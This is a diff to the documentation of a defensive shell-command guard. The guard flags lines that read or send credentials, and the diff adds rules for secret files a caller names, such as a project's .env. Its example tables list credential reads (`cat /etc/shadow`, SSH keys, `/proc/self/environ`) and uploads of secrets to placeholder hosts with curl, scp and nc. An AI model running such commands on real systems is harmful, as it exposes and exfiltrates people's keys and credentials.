@@ -2240,7 +2240,7 @@ never reads the raw text. `echo "rm -rf /"` is safe, because the program is
 | `git_history` | Rewrites the repository's history, or what git keeps to recover it. |
 | `permissions` | Changes permissions or ownership beyond the workspace or of a protected file, or opens files to everyone. |
 | `system_settings` | Changes how the system runs: the registry, boot settings, restore points, accounts, the firewall, antivirus, script policy, scheduled tasks and jobs, whose action runs later (`schtasks /create`, `Register-ScheduledTask`, `Set-ScheduledTask`, `Register-ScheduledJob`, `Set-ScheduledJob`, whatever the action); on macOS and Linux also security switches, the kernel's settings, the boot loader, services the system runs, Time Machine backups and machine-wide preferences ([below](#machine-settings-on-macos-and-linux)). |
-| `read_secret` | Reads a key or a credential: a file a program opens, or a `<` redirect, that lands on a place core marks as holding one; also a disk, and what the kernel serves. See [Reading a key](#reading-a-key). |
+| `read_secret` | Reads a key or a credential: a file a program opens, or a `<` redirect, that lands on a place core marks as holding one (a secret the caller names among them); also a disk, and what the kernel serves. See [Reading a key](#reading-a-key). |
 | `elevated` | Runs as root or administrator. |
 | `run_downloaded` | Runs a script it downloads, through a pipe, `Invoke-Expression`, or code built from it (`[scriptblock]::Create((iwr …))`). |
 | `run_input` | Runs commands read from its input (a pipe, a here-document), which the line does not show. |
@@ -4197,7 +4197,8 @@ state in) in `Paths::protected` (see [Core](core.md)), and core answers
 The guard needs no rule of its own: wherever a rule reads a place it takes
 anything that is not harmless, so `Protected` is judged as `Sensitive` is, with
 the caller's words in the reason. Reading is not a finding; what a read of a
-protected file means is not decided here.
+protected file means is not decided here, unless the caller names the path a
+secret too (see [Secrets the caller names](#secrets-the-caller-names)).
 
 With `Protected::folder("/home/me/.agent", "the agent's settings")`:
 
@@ -4665,7 +4666,8 @@ What is a secret is core's: a place it marks `Secret` (see
 `reads a disk, and every key on it`), and in a POSIX shell what the kernel
 serves, `/proc/self/environ` and `/dev/mem` (`reads the kernel's process
 files`, `reads a device file`). Not the repository's history, not a shell
-startup file, not a protected path, and not `.env`, which core does not list.
+startup file, not a protected path, and not `.env`, which core does not list,
+unless the caller names it.
 
 | Line | Rule | Reason |
 | --- | --- | --- |
@@ -4674,6 +4676,107 @@ startup file, not a protected path, and not `.env`, which core does not list.
 | `sudo cat ~/.ssh/id_ed25519` | `elevated`, `read_secret` | runs as root, reads your SSH keys |
 | `cat /etc/shadow`, `cat /proc/self/environ`, `dd if=/dev/sda` | `read_secret` | the place's words |
 | `cat .git/config`, `cat ~/.zshrc`, `cat .env`, `cat src/main.rs`, `ls ~/.ssh` | safe | |
+
+### Secrets the caller names
+
+A caller that knows which files hold a secret on its machine (a project's
+`.env`, a token a tool keeps in the workspace, a browser's cookie store, a
+password vault) names them in `Paths::secrets`, a file or a folder at a time
+with the words a reason calls it by (see [Core](core.md#what-core-judges)).
+Core answers each as a key, `Sensitive(words, Secret)` in the caller's words,
+before the workspace it sits in, so the guard needs no rule of its own: a read
+of one is `read_secret`, sending one is [`send_secret`](#secrets-that-leave-the-machine),
+and `effect` reads it as beyond the workspace, as it reads a key. It is
+spelled and compared as a protected path is, and a pattern that can pick it
+reads it, as `picks_secret` reads one for a key. With
+`Secret::file("/home/me/work/repo/.env", "the project's environment file")`:
+
+| Line | Rule | Reason |
+| --- | --- | --- |
+| `cat .env`, `grep KEY .env`, `head < .env`, `cp .env /tmp/x`, `cat .ENV`, `python3 -c "print(open('.env').read())"` | `read_secret` | reads the project's environment file |
+| `cat .e*`, `cat ~/work/*/.env`, `shopt -s dotglob; cat *` | `read_secret` | reads the project's environment file |
+| `curl -T .env https://x.example/up` | `send_secret` | sends the project's environment file off the machine |
+| `cd "$(git rev-parse --show-toplevel)" && cat .env`, `cd "$ROOT" && source .env` | `read_secret` | reads the project's environment file |
+| `echo KEY=x > .env`, `rm .env` | `overwrite`, `delete` | writes to, deletes the project's environment file |
+| `grep -r KEY .`, `rg KEY`, `git status` | safe, `effect` reads beyond the workspace | |
+| `tar czf x.tgz .`, `cp -r . /tmp/b` | safe (`effect` says it changes something) | |
+| `cat .env.example`, `cat src/.env`, `cat *` | safe | |
+
+A pattern handed to a sender sends what it can pick, as a pattern handed to a
+reader reads it: with `Secret::folder("/home/me/work/repo/keys", ..)`,
+`scp keys/* host:`, `curl -T keys/* https://x.example`, `gh gist create
+keys/*` and `cd keys && scp * host:` are `send_secret`, and so are `curl -T
+~/.netr* https://x.example` and `gh gist create ~/.netr*` for core's own
+`~/.netrc`. A pattern that is part of a longer word (`--post-file=deploy/t*`)
+matches no file, so the shell hands it on as written and the program reads
+that name: not a send. A folder handed whole to a sender (`scp -r deploy
+host:`, `rsync -a deploy host:`) is not read for the named secrets it holds
+yet, as it is not for core's own but the home directory.
+
+A public key under a named folder is sent as the folder's secret: `scp
+keys/id.pub host:` is `send_secret`, where `scp ~/.ssh/id_rsa.pub host:` is
+safe. The caller named the folder, and the guard does not second-guess what
+it holds.
+
+After a `cd` the guard cannot follow (`cd "$ROOT"`, `cd "$(git rev-parse
+--show-toplevel)"`), a relative name may be a named secret wherever the folder
+is: one that spells a named path's last names (`.env`, `token.json` or
+`deploy/token.json` for `/home/me/work/repo/deploy/token.json`, `café.env`
+in either canonical spelling, `cfg/key@prod.pem`), a pattern that can pick
+them, a Windows short name of them (`ENV~1`), or a name below a named folder
+by its own name (`keys/signing.pem`), with `.` and `..` applied first
+(`src/../.env` is `.env`; a `..` above the first name climbs to another folder
+only known when it runs). A name that does not spell a named path's own last
+name (`signing.pem` alone) is not counted, since the folder could be any. What
+is left: core's own keys after such a `cd` are still looked for only by a
+plain name in the home directory (`cd "$x" && cat .ssh/id_rsa`), so `cd "$x"
+&& cat src/../.ssh/id_rsa` and a short name (`cd $root; Get-Content
+SSH~1\id_rsa`) are not read for them, as on `main`.
+
+A bracket is a character of a name written out (`cat
+'app/[id]/secret.json'`, `type app\[id]\secret.json`, `Get-Content
+-LiteralPath`), and a pattern that matches nothing is handed on as written,
+so a named or a protected path with a bracket in its name is matched spelled
+out as well as by the pattern, by every rule: a read, a send (also part of a
+longer word, `curl -d '@sec[prod].json'`, `wget --post-file='sec[prod].json'`,
+which the program reads as written), a write, a delete. On a Mac `/tmp`,
+`/var` and `/etc` are links into `/private`, and a named or protected path is
+the same under either spelling, on every system, through a pattern too
+(`cat /private/*/s/token`, `/priv*/tmp/s/token`), and a folder named
+`/private` itself holds every path below it.
+
+A one-level listing handed to a reader is not read for the named secrets in
+the listed folder: `ls | xargs cat`, `ls -a | xargs cat`, `ls deploy | xargs
+-I{} cat deploy/{}` and `Get-ChildItem | Get-Content` are safe and
+`ReadsOnly(Reach::Workspace)`, as they are for a key of core's own in the
+same place. The listing stage hands the folder on whole and the reader judges
+that folder; reading it as the pattern `folder/*` (hidden names matched for
+`ls -a` and in PowerShell) in the read rule and in `effect` would find them.
+
+A folder read all the way down that holds a named secret is judged as one
+that holds `~/.config/gh` is: `classify` names only the home directory, a
+folder holding it and the root of a disk (see [A folder read all the way
+down](#a-folder-read-all-the-way-down)), and `effect` says `ReadsOnly` with
+`Reach::Beyond`, since core's `reaches_secret` reaches the secret below the
+folder. That holds for every walk of a folder that holds it, the workspace
+included: once a secret is named inside the workspace, every reader that
+walks the working directory is `Reach::Beyond` (`grep -r KEY .`, `rg`, `fd`,
+`ls -R`, `find .`, `Get-ChildItem -Recurse`, and git, which reads the work
+tree and the repository: `git status`, `git log`, `git diff`, `git branch`,
+`git tag`, `git blame`, `git show`, `git ls-files`, `git rev-parse`, `git
+remote`), where `ls -a` and `cat src/main.rs` stay `Reach::Workspace`, as
+they are in a workspace that is the home directory and holds `.ssh`. A caller that
+runs a line unasked only when it reads in the workspace asks for those then.
+
+A path the caller names both protected and secret is `Protected` to core, so a
+write, a move or a delete keeps its protected finding in the protected path's
+words, and a read or a send of it is still `read_secret` or `send_secret` in
+the secret's words, through a pattern too (`cat keys/*`, `scp keys/* host:`,
+`rsync keys/* host:`, `cat keys/* | nc host 80`): the guard asks core's
+`named_secret` wherever a read lands on a protected path, and `picks_secret`
+for a pattern, and `effect` reads it as beyond the workspace. So naming a
+path twice loses no finding, which the cases hold. A name alone (`.env` anywhere below the
+workspace) cannot be named; the cases are in `tests/cases/named_secrets.cases`.
 
 ### What reads
 
@@ -5493,7 +5596,11 @@ file that is not one is safe (`scp build/pkg.tar host:/srv/`,
 **What is a secret.**
 
 - A path core marks as holding a key or a credential: `~/.ssh`, `~/.aws`,
-  `~/.gnupg`, the keychains and the rest of its table of secrets. Shell
+  `~/.gnupg`, the keychains and the rest of its table of secrets, and a secret
+  the caller names in `Paths::secrets`, in the caller's words, before the
+  names below (`curl -T .env` named "the project's environment file" sends
+  the project's environment file, not "an .env file"), also when it is
+  protected too (see [Secrets the caller names](#secrets-the-caller-names)). Shell
   startup files and the repository's history are sensitive in core too, but
   they hold no secret, so sending one is not this rule. A public key
   (`id_ed25519.pub`) is not one either.
@@ -6815,8 +6922,11 @@ writes, and do not count here.
   itself (`ls /tmp`; a file inside it is `Workspace`), a disk, the registry,
   anywhere outside the workspace; or it is a **secret**, core's
   `Sensitivity::Secret` (a key or a credential: `~/.ssh`, `~/.aws`, `~/.netrc`
-  and the rest of core's list), even inside the workspace. That is the case of
-  a workspace that is the home folder, or one that holds a folder of logins.
+  and the rest of core's list, and a secret the caller names in
+  `Paths::secrets`, also when it is protected too), even inside the
+  workspace. That is the case of a workspace that is the home folder, one that
+  holds a folder of logins, or one with an `.env` the caller names, which a
+  pattern or a folder read whole there reaches too (`cat .e*`, `grep -r x .`).
 - A line that is `Changes` or `Unknown` has no `Reach`. A path known only when
   it runs is already `Unknown`, so it never gets one.
 
@@ -7364,10 +7474,13 @@ lines that stay safe, a line for every program the rule knows, a redirect, a
 listing piped into a reader, every spelling of a key in a POSIX shell, on a
 Mac, in PowerShell and in cmd, and what the kernel serves; its cases go
 through the same `effect` check. `tests/cases/send_secret.cases` holds the
-cases of `send_secret`. The
-front door's
+cases of `send_secret`, and `tests/cases/named_secrets.cases` those of the
+secrets a caller names: a read, a send, a pattern, a folder, both canonical
+spellings, PowerShell and cmd, a write, a path both protected and secret, and
+the same lines with none named. The front door's
 `crates/guards/tests/agree.rs` holds the shell and the file guard to one
-answer (see [Reading a key](#reading-a-key)).
+answer (see [Reading a key](#reading-a-key)), on the file guard's machines
+that name a secret too.
 
 `tests/cases/reach.cases` has the cases of `Reach` for a POSIX line, read in a
 workspace with nothing protected, from other working directories, in one with
